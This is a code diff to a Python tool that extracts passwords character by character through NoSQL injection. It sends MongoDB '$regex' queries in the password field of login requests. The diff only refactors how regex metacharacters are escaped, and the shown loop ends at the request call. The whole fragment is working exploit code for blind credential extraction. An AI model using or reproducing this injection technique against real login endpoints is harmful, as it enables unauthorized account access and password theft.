@@ -19,18 +19,16 @@ def enumeratePassword(url, session, username, progress_bar):
         
         for character in characters:
             if character in '.^$*+?{}[]\\|()':
-                regex_character = '\\' + character
-            else:
-                regex_character = character
-            
+                character = '\\' + character
+
             data = {
                 'username': username,
                 'password': {
-                    '$regex': f'^{password}{regex_character}'
+                    '$regex': f'^{password}{character}'
                 }
             }
             
-            progress_bar.status(f"{{'username': '{username}', 'password': {{'$regex': '^{password}{regex_character}'}}}}")
+            progress_bar.status(f"{{'username': '{username}', 'password': {{'$regex': '^{password}{character}'}}}}")
             
             try:
                 request = session.post(url, json=data, allow_redirects=False, timeout=300)
